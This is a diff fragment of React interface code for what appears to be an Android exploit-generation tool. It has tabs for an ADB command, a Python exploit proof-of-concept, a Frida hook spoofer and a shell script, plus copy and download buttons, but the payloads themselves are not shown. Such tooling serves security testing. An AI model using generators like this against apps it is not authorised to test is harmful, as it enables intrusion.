+            <div style={{ fontSize: "12px", color: "var(--text-muted)", padding: "10px" }}>
+              No extra parameters configured. Click "Add Extra Parameter" or use a preset above.
+            </div>
+          )}
+        </div>
+      </div>
+
+      {/* Live Payload Preview & Export Code Generator */}
+      <div className="panel full" style={{ padding: "20px 24px" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "14px", flexWrap: "wrap", gap: "10px" }}>
+          <div style={{ display: "flex", gap: "8px" }}>
+            <button
+              className="secondary"
+              style={{
+                padding: "6px 12px",
+                fontSize: "12px",
+                background: activeCodeTab === "adb" ? "rgba(56, 189, 248, 0.2)" : undefined,
+                borderColor: activeCodeTab === "adb" ? "rgba(56, 189, 248, 0.5)" : undefined,
+                color: activeCodeTab === "adb" ? "#38bdf8" : undefined,
+              }}
+              onClick={() => setActiveCodeTab("adb")}
+            >
+              <Terminal size={13} /> ADB Shell Command
+            </button>
+            <button
+              className="secondary"
+              style={{
+                padding: "6px 12px",
+                fontSize: "12px",
+                background: activeCodeTab === "python" ? "rgba(56, 189, 248, 0.2)" : undefined,
+                borderColor: activeCodeTab === "python" ? "rgba(56, 189, 248, 0.5)" : undefined,
+                color: activeCodeTab === "python" ? "#38bdf8" : undefined,
+              }}
+              onClick={() => setActiveCodeTab("python")}
+            >
+              <Code2 size={13} /> Python Exploit PoC
+            </button>
+            <button
+              className="secondary"
+              style={{
+                padding: "6px 12px",
+                fontSize: "12px",
+                background: activeCodeTab === "frida" ? "rgba(56, 189, 248, 0.2)" : undefined,
+                borderColor: activeCodeTab === "frida" ? "rgba(56, 189, 248, 0.5)" : undefined,
+                color: activeCodeTab === "frida" ? "#38bdf8" : undefined,
+              }}
+              onClick={() => setActiveCodeTab("frida")}
+            >
+              <Sparkles size={13} /> Frida Hook Spoofer
+            </button>
+            <button
+              className="secondary"
+              style={{
+                padding: "6px 12px",
+                fontSize: "12px",
+                background: activeCodeTab === "bash" ? "rgba(56, 189, 248, 0.2)" : undefined,
+                borderColor: activeCodeTab === "bash" ? "rgba(56, 189, 248, 0.5)" : undefined,
+                color: activeCodeTab === "bash" ? "#38bdf8" : undefined,
+              }}
+              onClick={() => setActiveCodeTab("bash")}
+            >
+              <Terminal size={13} /> Shell Script (.sh)
+            </button>
+          </div>
+
+          <div style={{ display: "flex", gap: "8px" }}>
+            <button className="primary" style={{ fontSize: "12px", padding: "6px 12px" }} onClick={copyActiveCode}>
+              {copied ? <Check size={14} /> : <Copy size={14} />}
+              {copied ? "Copied!" : "Copy Payload"}
+            </button>
+            <button className="secondary" style={{ fontSize: "12px", padding: "6px 12px" }} onClick={downloadScript}>
+              <Download size={14} /> Download Script
+            </button>
+          </div>
+        </div>
+
+        {/* Code Output Viewer */}
+        <div
+          style={{
+            background: "#03060d",
+            padding: "16px 18px",
+            borderRadius: "10px",
+            fontFamily: "var(--font-mono)",
+            fontSize: "12px",
+            color: "#38bdf8",
+            overflowX: "auto",
+            border: "1px solid rgba(255, 255, 255, 0.08)",
+            whiteSpace: "pre-wrap",
+            lineHeight: 1.5,
+          }}
+        >
+          {activeCodeTab === "adb" && adbCommand}
+          {activeCodeTab === "python" && pythonPoc}
+          {activeCodeTab === "frida" && fridaPoc}
+          {activeCodeTab === "bash" && bashPoc}
+        </div>
       </div>
     </div>
   );
